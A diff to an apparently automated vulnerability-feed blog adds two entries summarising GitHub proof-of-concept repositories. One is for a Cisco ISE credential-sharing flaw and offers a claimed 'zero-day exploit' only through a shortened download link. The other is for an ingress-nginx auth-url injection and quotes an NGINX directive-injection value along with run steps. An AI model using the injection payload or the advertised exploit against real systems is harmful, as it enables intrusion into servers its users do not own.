@@ -4,6 +4,60 @@
   
   
   <entry>
+    <title>Cisco ISE 클라우드 자격 증명 공유 취약점</title>
+    <link href="/2025/06/11/github_3557636342/"/>
+    <url>/2025/06/11/github_3557636342/</url>
+    
+    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Cisco ISE 클라우드 자격 증명 공유 취약점</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2025-20286</li></ul><p><strong>漏洞类型：</strong> 信息泄露</p><p><strong>漏洞等级：</strong> 严重</p><p><strong>漏洞描述：</strong> Cisco Identity Services Engine (ISE) 클라우드 환경에서 자격 증명 생성 및 권한 부여 로직의 심각한 결함으로 인해 동일 소프트웨어 버전과 동일 클라우드 플랫폼에서 배포된 여러 Cisco ISE 클라우드 인스턴스가 동일한 자격 증명을 공유하게 됩니다. 이로 인해 인증되지 않은 원격 공격자가 유효한 자격 증명을 탈취하고 다양한 배포 환경에서 권한 상승을 수행할 수 있습니다.</p><p><strong>产品厂商：</strong> Cisco</p><p><strong>产品名称：</strong> Cisco Identity Services Engine (ISE)</p><p><strong>来源：</strong> <a href="https://github.com/rbaicba/CVE-2025-20286">https://github.com/rbaicba/CVE-2025-20286</a></p><p><strong>类型：</strong> CVE-2025:github search</p><h1 id="仓库文件"><a href="#仓库文件" class="headerlink" title="仓库文件"></a>仓库文件</h1><ul><li>LICENSE</li><li>README.md</li></ul><h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1><h2 id="Cisco-ISE-클라우드-자격-증명-공유-취약점-제로데이-익스플로잇-CVE-2025-20286"><a href="#Cisco-ISE-클라우드-자격-증명-공유-취약점-제로데이-익스플로잇-CVE-2025-20286" class="headerlink" title="Cisco ISE 클라우드 자격 증명 공유 취약점 제로데이 익스플로잇 (CVE-2025-20286)"></a>Cisco ISE 클라우드 자격 증명 공유 취약점 제로데이 익스플로잇 (CVE-2025-20286)</h2><p>심각도: 치명적 (CVSS 9.9)</p><p>영향 받는 플랫폼: AWS, Microsoft Azure, Oracle Cloud Infrastructure (OCI)에서 배포된 Cisco Identity Services Engine (ISE) 클라우드 환경</p><p>취약점 설명: 자격 증명 생성 및 권한 부여 로직의 심각한 결함으로 인해 동일 소프트웨어 버전과 동일 클라우드 플랫폼에서 배포된 여러 Cisco ISE 클라우드 인스턴스가 동일한 자격 증명을 공유하게 됩니다. 이로 인해 인증되지 않은 원격 공격자가 유효한 자격 증명을 탈취하고 다양한 배포 환경에서 권한 상승을 수행할 수 있습니다.</p><p>익스플로잇 기능:</p><ul><li>원격 자격 증명 탈취</li><li>제한된 관리자 작업 수행</li><li>시스템 구성 변경</li><li>서비스 중단</li></ul><p>공격 방법: 네트워크 기반, 사전 인증 불필요</p><p>안정성: 완전히 개발 및 테스트된 익스플로잇이며, 상세한 배포 지침 포함</p><p><strong>👉 <a href="https://h1.nu/14blP">파일 다운로드</a></strong></p>]]></content>
+    
+    
+    <categories>
+      
+      <category>Github Poc</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>信息泄露</tag>
+      
+      <tag>CVE-2025:github search</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>ingress-nginx auth-url 注入漏洞</title>
+    <link href="/2025/06/11/github_3279774123/"/>
+    <url>/2025/06/11/github_3279774123/</url>
+    
+    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> ingress-nginx auth-url 注入漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2025-24514</li></ul><p><strong>漏洞类型：</strong> 命令执行</p><p><strong>漏洞等级：</strong> 高危</p><p><strong>漏洞描述：</strong> CVE-2025-24514是Kubernetes Ingress Controller中<code>ingress-nginx</code>的一个漏洞，允许通过<code>nginx.ingress.kubernetes.io/auth-url</code>注解意外注入NGINX配置。包含恶意路径（如<code>/;error_log /dev/stdout;</code>）可以篡改NGINX配置文件，导致任意命令执行或信息泄露。</p><p><strong>产品厂商：</strong> Kubernetes</p><p><strong>产品名称：</strong> ingress-nginx</p><p><strong>来源：</strong> <a href="https://github.com/KimJuhyeong95/cve-2025-24514">https://github.com/KimJuhyeong95/cve-2025-24514</a></p><p><strong>类型：</strong> CVE-2025:github search</p><h1 id="仓库文件"><a href="#仓库文件" class="headerlink" title="仓库文件"></a>仓库文件</h1><ul><li>CVE-2025-24514 _상세보고서.docx</li><li>CVE-2025-24514 _상세보고서.pdf</li><li>LICENSE.txt</li><li>README.md</li><li>cve_2025_24514_poc.py</li></ul><h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1><h2 id="🔥-CVE-2025-24514-원격-취약점-점검-PoC"><a href="#🔥-CVE-2025-24514-원격-취약점-점검-PoC" class="headerlink" title="🔥 CVE-2025-24514 원격 취약점 점검 PoC"></a>🔥 CVE-2025-24514 원격 취약점 점검 PoC</h2><p>이 스크립트는 CVE-2025-24514 취약점(ingress-nginx의 <code>auth-url</code> 주입을 통한 NGINX 설정 조작 및 RCE 가능성)에 대해 <strong>원격으로 점검</strong>할 수 있는 Python 기반 PoC입니다.</p><hr><h3 id="🧠-취약점-개요"><a href="#🧠-취약점-개요" class="headerlink" title="🧠 취약점 개요"></a>🧠 취약점 개요</h3><ul><li><strong>CVE-2025-24514</strong>는 Kubernetes Ingress Controller 중 <code>ingress-nginx</code>에서 <code>nginx.ingress.kubernetes.io/auth-url</code> 어노테이션을 통해 <strong>NGINX 설정이 의도치 않게 주입</strong>되는 취약점입니다.</li><li>악의적인 경로(<code>/;error_log /dev/stdout;</code>)를 포함하면 NGINX 설정 파일이 변조되어 <strong>임의 명령 실행 또는 정보 유출</strong>이 가능합니다.</li></ul><hr><h3 id="✅-PoC-주요-기능"><a href="#✅-PoC-주요-기능" class="headerlink" title="✅ PoC 주요 기능"></a>✅ PoC 주요 기능</h3><ul><li>대상 서버에 HTTP 요청을 전송하여 <code>auth-url</code> 설정 주입 시도</li><li>응답 내 <code>error_log</code>, <code>auth-url</code> 문자열 존재 여부로 <strong>취약 여부 판별</strong></li><li>Windows CMD, PowerShell, Linux&#x2F;Bash 호환</li><li><code>colorama</code>를 통한 색상 출력 지원</li></ul><hr><h3 id="📦-설치-및-실행-방법"><a href="#📦-설치-및-실행-방법" class="headerlink" title="📦 설치 및 실행 방법"></a>📦 설치 및 실행 방법</h3><h4 id="1-Python-설치"><a href="#1-Python-설치" class="headerlink" title="1. Python 설치"></a>1. Python 설치</h4><p>Python 3.x 환경이 필요합니다.</p><h4 id="2-의존-패키지-설치"><a href="#2-의존-패키지-설치" class="headerlink" title="2. 의존 패키지 설치"></a>2. 의존 패키지 설치</h4><p>bash<br>pip install requests colorama&#96;&#96;&#96;</p><h4 id="3-PoC-실행"><a href="#3-PoC-실행" class="headerlink" title="3. PoC 실행"></a>3. PoC 실행</h4><p>bash<br>python cve_2025_24514_remote_poc.py</p><hr><h3 id="🖥️-실행-예시"><a href="#🖥️-실행-예시" class="headerlink" title="🖥️ 실행 예시"></a>🖥️ 실행 예시</h3><p>bash<br>복사<br>편집<br>[&#x3D;] CVE-2025-24514 원격 취약점 점검 PoC 시작 &#x3D;</p><p>[?] 대상 서버 URL&#x2F;IP를 입력하세요 (예: <a href="http://192.168.0.0/">http://192.168.0.0</a>): <a href="http://192.168.0.0/">http://192.168.0.0</a><br>[+] 대상에 악성 요청 전송 중: <a href="http://192.168.0.0/">http://192.168.0.0</a><br>[+] HTTP 응답 코드: 200<br>[+] 응답 내용 (앞 300자):</p><html><body>Welcome...</body></html>[!!!] 취약 가능성이 매우 높음: NGINX 설정 노출 의심됨<hr><h3 id="🔍-취약-조건"><a href="#🔍-취약-조건" class="headerlink" title="🔍 취약 조건"></a>🔍 취약 조건</h3><p>본 PoC가 작동하기 위해서는 다음 조건 중 일부가 만족되어야 합니다:</p><p>대상 서버가 Ingress-NGINX 컨트롤러를 외부에서 접근 가능한 상태로 운영 중</p><p>auth-url 어노테이션을 필터링 없이 처리하고 있음</p><p>요청 Host 헤더에 따른 리버스 프록시 동작이 적용됨</p><hr><h3 id="⚠️-주의사항"><a href="#⚠️-주의사항" class="headerlink" title="⚠️ 주의사항"></a>⚠️ 주의사항</h3><p>이 스크립트는 보안 점검 및 테스트 목적으로만 사용해야 합니다.</p><p>무단 점검은 법적 책임을 초래할 수 있습니다.</p><p>취약하다고 판단된 서버는 즉시 보안 패치를 적용하거나 어노테이션 필터링을 적용해야 합니다.</p><hr><h3 id="🔧-대응-방안"><a href="#🔧-대응-방안" class="headerlink" title="🔧 대응 방안"></a>🔧 대응 방안</h3><p>ingress-nginx 최신 버전으로 업데이트</p><p>auth-url, auth-signin 어노테이션에 대한 사용자 입력 검증 적용</p><p>외부 요청에서 설정 주입 가능한 URI 패턴 차단</p><hr><h3 id="📄-참고자료"><a href="#📄-참고자료" class="headerlink" title="📄 참고자료"></a>📄 참고자료</h3><p>Nginx Ingress Controller GitHub</p><p>CVE 상세정보 - CVE-2025-24514</p><p>Ingress-NGINX 취약점 보안 권고</p><hr><h3 id="📫-문의"><a href="#📫-문의" class="headerlink" title="📫 문의"></a>📫 문의</h3><p>버그 신고나 제안사항은 email 또는 PR로 남겨주세요.</p><hr><h3 id="📝-License"><a href="#📝-License" class="headerlink" title="📝 License"></a>📝 License</h3><p>This project is licensed under the MIT License - see the LICENSE file for details. Copyright (c) 2025 KimJuhyeong95</p>]]></content>
+    
+    
+    <categories>
+      
+      <category>Github Poc</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>命令执行</tag>
+      
+      <tag>CVE-2025:github search</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>Blackash-CVE-2025-21333</title>
     <link href="/2025/06/11/github_1879249920/"/>
     <url>/2025/06/11/github_1879249920/</url>
